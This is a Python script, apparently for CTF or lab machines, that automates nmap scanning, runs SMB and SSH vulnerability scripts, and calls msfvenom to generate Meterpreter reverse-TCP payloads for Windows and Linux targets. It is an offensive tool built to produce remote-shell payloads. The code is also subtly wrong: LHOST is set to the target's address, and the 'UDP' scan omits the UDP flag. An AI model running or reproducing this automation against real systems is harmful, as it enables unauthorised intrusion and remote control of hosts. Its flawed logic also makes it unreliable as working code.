# This script adds the following functionality to the previous scripts:
# 
# 1. Advanced Nmap Scripts:
# - The script will run advanced Nmap scripts based on the machine type. For Windows, it will run SMB vulnerability scripts, and for Linux, it will run SSH vulnerability scripts. If the machine type is unknown, it will run default scripts.
# 
# 2. Payload Generation:
# - The script will generate payloads using msfvenom based on the machine type. For Windows, it will generate a Meterpreter reverse TCP payload in EXE format, and for Linux, it will generate a Meterpreter reverse TCP payload in ELF format.

import os
import subprocess

# ... [Previous functions: get_user_input, setup_directory_structure, install_tools, initial_nmap_scan]

def nmap_scan_choice(machine_ip, base_dir):
    print("\nChoose the type of Nmap scan you want to perform:")
    print("1. Quick scan")
    print("2. Regular TCP scan")
    print("3. Full TCP ports scan")
    print("4. TCP ports service scan and NSE scripts")
    print("5. Full UDP Scan")

    choice = input("Enter your choice (1-5): ")

    if choice == "1":
        cmd = f"nmap -Pn -n -vv --open -F -T4 {machine_ip} -oA {base_dir}/nmap-fast-tcp"
    elif choice == "2":
        cmd = f"nmap -Pn -n -vv --open -T4 {machine_ip} -oA {base_dir}/nmap-regular-tcp"
    elif choice == "3":
        cmd = f"nmap -Pn -n -p- -vv --open -T4 {machine_ip} -oA {base_dir}/nmap-full-tcp"
    elif choice == "4":
        ports_list = input("Enter the list of TCP ports (comma-separated) or leave blank for all: ")
        if not ports_list:
            ports_list = "-p-"
        else:
            ports_list = f"-p {ports_list}"
        cmd = f"nmap -Pn -n {ports_list} -vv --open -sV -sC --script='vuln and safe' -T4 {machine_ip} -oA {base_dir}/nmap-version-tcp"
    elif choice == "5":
        cmd = f"nmap -Pn -n -p- -vv --open --max-retries 1 --min-rate 1000 -T4 {machine_ip} -oA {base_dir}/nmap-full-udp"
    else:
        print("Invalid choice. Please choose a valid option.")
        return

    try:
        subprocess.run(cmd, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error during Nmap scan: {e}")

def generate_payloads(machine_ip, machine_type, base_dir):
    """Generate payloads based on the machine type and Nmap scan results."""
    payloads_dir = os.path.join(base_dir, "payloads")
    if not os.path.exists(payloads_dir):
        os.makedirs(payloads_dir)
    
    # Check if msfvenom is installed
    if not subprocess.run(["which", "msfvenom"], stdout=subprocess.PIPE).stdout:
        print("Error: msfvenom not found. Please install Metasploit Framework.")
        return
    
    # Determine which payloads to generate based on the machine type
    if machine_type == "Windows":
        payload = f"msfvenom -p windows/meterpreter/reverse_tcp LHOST={machine_ip} LPORT=1337 -f exe > {payloads_dir}/windows_payload.exe"
    elif machine_type == "Linux":
        payload = f"msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={machine_ip} LPORT=1337 -f elf > {payloads_dir}/linux_payload.elf"
    else:
        print("Unknown machine type. Cannot generate payload.")
        return

    # Generate the payload
    try:
        subprocess.run(payload, shell=True, check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error during payload generation: {e}")

def advanced_nmap_scan(machine_ip, machine_type, base_dir):
    nmap_dir = os.path.join(base_dir, "nmap")
    vulnscan_file = os.path.join(nmap_dir, "vulnscan.txt")
    
    # Determine which Nmap scripts to run based on the machine type
    if machine_type == "Windows":
        scripts = "smb-vuln*"
    elif machine_type == "Linux":
        scripts = "ssh-vuln*"
    else:
        scripts = "default"
    
    # Check if the Nmap scripts are available
    script_path = "/usr/share/nmap/scripts"
    if not os.path.exists(script_path):
        print(f"Error: Nmap scripts directory {script_path} not found.")
        return
    
    # Run the advanced Nmap scan
    try:
        subprocess.run(["nmap", "--script", scripts, "-oN", vulnscan_file, machine_ip], check=True)
    except subprocess.CalledProcessError as e:
        print(f"Error during advanced Nmap scan: {e}")

def main():
    handle, machine_name, machine_ip, machine_type = get_user_input()
    base_dir = setup_directory_structure(machine_name)
    print(f"Directory structure set up at: {base_dir}")

    install_tools(base_dir)
    print("Tools installed.")

    if not machine_type:
        machine_type = initial_nmap_scan(machine_ip, base_dir)
        print(f"Machine type determined as: {machine_type}")
    else:
        print(f"Machine type provided as: {machine_type}")

    advanced_nmap_scan(machine_ip, machine_type, base_dir)
    print("Advanced Nmap scan completed.")

    generate_payloads(machine_ip, machine_type, base_dir)
    print("Payloads generated.")

if __name__ == "__main__":
    main()
